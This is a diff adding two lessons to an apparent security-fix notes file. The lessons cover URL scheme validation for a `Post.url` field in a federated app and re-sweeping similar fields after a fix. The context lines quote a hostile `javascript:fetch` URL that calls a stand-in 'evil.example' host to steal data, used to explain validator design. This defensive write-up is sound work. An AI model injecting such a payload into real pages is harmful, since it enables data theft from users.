@@ -13018,3 +13018,17 @@ allowlist still needs, because `HTTPS://` is a real URL a browser fetches -- hen
 `startswith` rather than `in`, so `javascript:fetch('https://evil.example/steal')` cannot pass by carrying a
 valid scheme further along the string -- the row that separates the two operators has to put a real
 `https://` INSIDE a hostile URL, which is easy to leave out of a table of bad values.
+
+**902. A PREDICATE'S DOCSTRING SAYING WHAT IT DOES NOT CHECK IS A LIST OF THINGS ITS CALLERS HAVE TO CHECK.**
+`url_is_parseable` states outright "No scheme check, no host check, no length check -- those belong to the
+callers that want them", and it was the ONLY guard on four writes to `Post.url`, a field rendered as a bare
+`href` in ten templates and federated back out as a Link attachment. The narrowness was right and
+documented; what was missing is a caller doing the other half. When a boundary delegates to a deliberately
+narrow predicate, grep its callers and ask which of the named omissions each one needs.
+
+**903. THE SAME DEFECT SHAPE USUALLY HAS A SECOND SITE, AND THE FIRST FIX IS THE BEST TIME TO LOOK.**
+D1403 was a peer's Event links stored without a scheme check. The identical hole was at `Post.url` -- six
+attachment shapes plus the Update path, and a much wider render surface -- found by carrying the same sweep
+one field further rather than closing the round. Round 211 found three copies of one validator bug for the
+same reason. After fixing a class of defect, re-run the sweep that found it against every field of the same
+KIND, not only the one that failed.
